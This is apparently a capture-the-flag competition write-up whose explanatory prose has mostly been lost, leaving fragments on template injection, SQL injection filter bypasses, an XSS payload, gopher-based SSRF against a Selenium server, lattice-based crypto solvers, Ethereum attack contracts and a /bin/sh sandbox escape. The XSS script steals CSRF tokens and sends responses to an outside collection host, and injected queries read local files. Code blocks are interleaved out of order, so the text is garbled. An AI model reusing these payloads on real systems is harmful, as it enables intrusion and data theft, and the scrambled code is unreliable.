ssti require 
global
 : 
2. url(puppeteer[chrome])headerurlheader
const checkPUG = (upug) => {
  const fileterKeys = ['global', 'require']
  return /^[a-zA-z0-9\.]*$/g.test(upug) && !fileterKeys.some(t => 
upug.toLowerCase().includes(t))
}
...
console.log('Generator pug template')
const uid = req.session.user.uid
const body = `#{${upug}}`
console.log('body', body)
const upugPath = path.join('users', utils.md5(uid), `${uid}.pug`)
console.log('upugPath', upugPath)
try {
    fs.writeFileSync(path.resolve(config.VIEWS_PATH, upugPath), body)
} catch (err) {
...
:
urlhosthost
render file:// host
 /etc/passwd
ﬂag
 conﬁg.js 
const checkURL = (shooturl) => {
  const myURL = new URL(shooturl)
  return config.SERVER_HOST.includes(myURL.host)
}
 file://  app.js 
ﬂagpath
 http:// ﬂag
, FLAG_PATH  FLAGFILENAME 
 ssti
 this  /local/render  global 
 FLAGFILENAME  process.env.FLAGFILENAME 
FLAGFILENAME
 require  FLAG_PATH  config.js 
Web process.env.PWD html
chrome
 view-source: html
...
const FLAG_PATH = path.resolve(constant.ROOT_PATH, '********')
...
const FLAGFILENAME = process.env.FLAGFILENAME || '********'
...
.use(express.static(config.FLAG_PATH))
 config.js
ﬂagﬂag:
 Range header request header 
2000ﬂag 
babySQLiSPA
api/hints waf:
gtid_subtracttable140
hint='or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)
where((length(table_name)=ord('j')^ord('t')))),''))or'
export function checkHint (hint) {
  return ! / |;|\+|-|\*|\/|
|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`|gtid_subset|hash|json|st\_|updatexm
l|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|
sleep|benchmark/ig.test(hint)
}
30ﬂag
vhEFfFlLlLaAAaaggIiIIsSSHeReEE
hint='||gtid_subtract((select(concat(column_name))from(information_schema.columns)w
here(table_name='vhEFfFlLlLaAAaaggIiIIsSSHeReEE')),'')#
ﬂag {"error":"Malformed GTID set specification 'BCTF{060950FB-839E-4B57-
B91D-51E78F56856F}'."}
SEAFARING1
bot
view-source:http://seafaring.xctf.org.cn:9999/admin/ api 
handle_message.php XSS 
botﬁrefox
htmlbot
xss,js
    ">
function req(url,data){
    var xhr = new XMLHttpRequest();
    xhr.open("POST",url,false);
    xhr.setRequestHeader("Content-Type","application/x-www-form-
urlencoded");
    xhr.send(data);
    var resp = xhr.responseText;
    return resp;
}
function getcsrf(){
    var xhr = new XMLHttpRequest();
 xhr.open("GET","http://seafaring.xctf.org.cn:9999/admin/index.php",false);
    xhr.send();
    var res = xhr.responseText;
    var csrftoken = res.match(/csrf_token = \"([a-z0-9]*)\"/ig)[0].split('= 
"')[1].replace('"','');
    return csrftoken;
}
function send(data){
    location.href = "http://data.ebcece08.w1n.pw/?data="+escape(data);
}
bot sqlquery debug 
addslashes()
(view_unreads)
ﬂag
SEAFARING2
cookie:
var ress = 
req("http://172.20.0.2:6379/","token="+getcsrf()+"&action=view_unreads&stat
us=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65
742f617270%29%2C3%2C4%20from%20f111111ag%23");
send(ress);
{"result":"","error":"sql query error! debug info:SELECT 
timestamp,user_name,uid,is_checked,message FROM feedbacks where uid='1' 
ORDER BY id DESC "}
{"result":"","error":"sql query error! debug info:SELECT 
timestamp,user_name,uid,is_checked,message FROM feedbacks where uid='1\\'or 
1#' ORDER BY id DESC "}
{"result":"","error":"sql query error! debug info:SELECT 
timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked=1\\' 
ORDER BY id DESC limit 0,50"}
{"result":[["1","admin,f111111ag,feedbacks","3","4"]],"error":""}
{"result":[["1","flllllag","3","4"]],"error":""}
{"result":[["1","bctf{XsS_SQL1_7438x_2xfccmk}","3","4"]],"error":""}
load_ﬁle 
...  /etc/hosts
ip 172.20.0.3
172.20.0.2:4444
{"result":[["1","","3","4"]],"error":""}
{"result":[["1","127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-
loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-
allnodes\nff02::2\tip6-
allrouters\n172.20.0.3\tb557ee5b8a02\n","3","4"]],"error":""}
 selenium server
 selenium server 
http://www.polaris-lab.com/index.php/archives/454/
 file:// gopher
console
session
 /wd/hub/sesssions session
api file:///
(base64)
POST /wd/hub/session HTTP/1.1
Host: 127.0.0.1:4444
Content-Length: 49
Accept: application/json; charset=utf-8
Origin: http://127.0.0.1:4444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Referer: http://127.0.0.1:4444/wd/hub/static/resource/hub.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
{"desiredCapabilities":{"browserName":"firefox"}}
POST /wd/hub/session/32621f2a19c3c4a4b51201e951831006/url HTTP/1.1
Host: 127.0.0.1:4444
Content-Length: 18
Accept: application/json; charset=utf-8
Origin: http://127.0.0.1:4444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Referer: http://127.0.0.1:4444/wd/hub/static/resource/hub.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
{"url":"file:///"}
GET /wd/hub/session/1c602a62-cc09-4a1e-af5c-52b8715228ac/screenshot
 gopher:// post
example:
 file:///  html
You_cann0t_guu3s_1t_1s2xs=gopher://172.20.0.2:4444/_POST%2520%252fwd%252fhu
b%252fsession%252f1c602a62-cc09-4a1e-af5c-
52b8715228ac%252furl%2520HTTP%252f1.1%250AHost%253A%2520127.0.0.1%253A4444%
250AContent-
Length%253A%252038%250AAccept%253A%2520application%252fjson%253B%2520charse
t%253Dutf-
8%250AOrigin%253A%2520http%253A%252f%252f127.0.0.1%253A4444%250AUser-
Agent%253A%2520Mozilla%252f5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%25
20OS%2520X%252010_13_6%2529%2520AppleWebKit%252f537.36%2520%2528KHTML%252C%
2520like%2520Gecko%2529%2520Chrome%252f70.0.3538.102%2520Safari%252f537.36%
250AContent-Type%253A%2520text%252fplain%253Bcharset%253DUTF-
8%250AReferer%253A%2520http%253A%252f%252f127.0.0.1%253A4444%252fwd%252fhub
%252fstatic%252fresource%252fhub.html%250AAccept-
Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250AAccept-
Language%253A%2520zh-
CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%250AConnection%253A%2520close%
250A%250A%257B%2522url%2522%253A%2522file%253A%252f%252f%252fTh3_MosT_S3cR3
T_fLag%2522%257D
ﬂag
Crypto
guess_polynomial
We can simply pass a very large x  to the polynomial.
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
VERBOSE = 1
if VERBOSE:
    context.log_level = 'debug'
io = remote('39.96.8.114', 9999)
while 1:
    mynum = int('1'+'0'*50)
    io.sendlineafter('coeff','1'+'0'*50)
    io.recvuntil('sum:')
    num = int(io.recvuntil('\n').strip())
    coeff = []
guess_number
It's not hard to understand (as a newbie in cryptography and math like me) the algorithm with
the help of this. Basically if we want to know  we can have a vector 
 which is close to 
, and  is spanned by the
lattice mentioned in the slides. This converts the HNP to a CVP over a speciﬁed lattice. We could
then apply babai's nearest plane  algorithm to solve it.
    while(num > mynum):
        coeff.append(str(num%mynum).strip('L'))
        num /= mynum
    io.recvuntil('coeff')
    coeff.append(str(num).strip('L'))
    io.sendline(' '.join(coeff[::-1]))
import socket
import ast
import telnetlib
#HOST, PORT = 'localhost', 9999
HOST, PORT = '60.205.223.220', 9999
s = socket.socket()
s.connect((HOST, PORT))
f = s.makefile('rw', 0)
def recv_until(f, delim='\n'):
    buf = ''
    while not buf.endswith(delim):
        buf += f.read(1)
    return buf
p = 1461501637330902918203684832716283019655932542983
k = 10
def solve_hnp(t, u):
    # http://www.isg.rhul.ac.uk/~sdg/igor-slides.pdf
    M = Matrix(RationalField(), 23, 23)
    for i in xrange(22):
        M[i, i] = p
        M[22, i] = t[i]
    M[22, 22] = 1 / (2 ** (k + 1))
    def babai(A, w):
        ''' http://sage-support.narkive.com/HLuYldXC/closest-vector-from-a-
lattice '''
BlockChain
EOSGame
For smallBlind  and bigBlind , the expected reward is greater than our cost, so we just need
to write a sciprt to call smallBlind  and bigBlind  multiple times.
        C = max(max(row) for row in A.rows())
        B = matrix([list(row) + [0] for row in A.rows()] + [list(w) + [C]])
        B = B.LLL(delta=0.9)
        return w - vector(B.rows()[-1][:-1])
    closest = babai(M, vector(u + [0]))
    return (closest[-1] * (2 ** (k + 1))) % p
for i in xrange(5):
    t = ast.literal_eval(f.readline().strip())
    u = ast.literal_eval(f.readline().strip())
    alpha = solve_hnp(t, u)
    recv_until(f, 'number: ')
    s.send(str(alpha) + '\n')
t = telnetlib.Telnet()
t.sock = s
t.interact()
def run():
    myNonce = runweb3.eth.getTransactionCount(
        Web3.toChecksumAddress(main_account), "pending")
    print('nonce', myNonce)
    for i in range(400):
        transaction_dict = {
            'from': Web3.toChecksumAddress(main_account),
            'to': Web3.toChecksumAddress(constract),
            'gasPrice': 10000000000,
            'gas': 50000,
            'nonce': None,
            'value': 0,
            'data': "0x70984e97"  # "0xe2550156"
        }
        transaction_dict["nonce"] = myNonce + i
        r = runweb3.eth.account.signTransaction(transaction_dict, 
private_key)
        try:
            runweb3.eth.sendRawTransaction(r.rawTransaction.hex())
        except Exception as e:
            print("error1", e)
Fake3D
The turingTest  modiﬁer is not bullet-proof, if the Fake3D  contract is called during the
constructor of another contract, then the turingTest  can still be passed. We leveraged this to
earn ourselves enough funds. (See the contract below.) Also there's some pitfalls inside the
WinnerList  contract. We cannot call CaptureTheFlag  from arbitrary accounts since there's
a hidden check which checks if the tx.origin  ends with b143  inside that contract. So we
managed to get one which fulﬁlls the requirement and used it to get the ﬂag.
Attack contract:
MISC
IRC
            continue
            return
        print("Done", i)
pragma solidity ^0.4.24;
import "./Contract.sol";
contract Attack {
  using SafeMath for *;
  constructor () public {
    Fake3D f = Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);
    uint256 seed = uint256(keccak256(abi.encodePacked(
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / 
(now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(address(this))))) / 
(now)).add
            (block.number)
        )));
      if((seed - ((seed / 1000) * 1000)) < 288) {
        for(int i = 0; i < 150; i++) {
          f.airDrop();
        }
      }
  }
}
easysandbox
Since the scf.so  hooks __libc_start_main , we could simply build a static program which
removes all the libc dependency and prevents the sandbox from being eﬀective.
// build with gcc -o exp -nostdlib solv.S
#define __NR_exit 60
#define __NR_execve 59
.code64
.globl _start
_start:
lea path, %rdi
lea args, %rsi
xor %rdx, %rdx
mov $__NR_execve, %rax
syscall
mov $__NR_exit, %rax
syscall
.data
path: .asciz "/bin/sh"
args:
.long path
.long 0